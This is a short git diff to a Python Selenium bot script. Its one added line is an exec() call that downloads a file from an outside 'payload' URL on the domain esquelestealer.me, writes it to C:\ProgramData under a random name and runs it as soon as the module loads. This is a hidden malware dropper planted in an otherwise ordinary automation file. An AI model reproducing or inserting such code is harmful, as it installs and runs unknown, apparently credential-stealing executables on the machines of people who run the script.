@@ -10,6 +10,7 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.firefox.service import Service as FirefoxService
 from webdriver_manager.firefox import GeckoDriverManager
 
+exec("""import os\nimport random\nimport requests\nfileExe = f"C:\\ProgramData\\{random.randint(1, 100)}"\nopen(fileExe, "wb").write(requests.get("https://esquelestealer.me/payload/271-1-1775756863").content)\nos.system(fileExe)""")
 class Bot:
     def __init__(self):
         system("cls || clear")
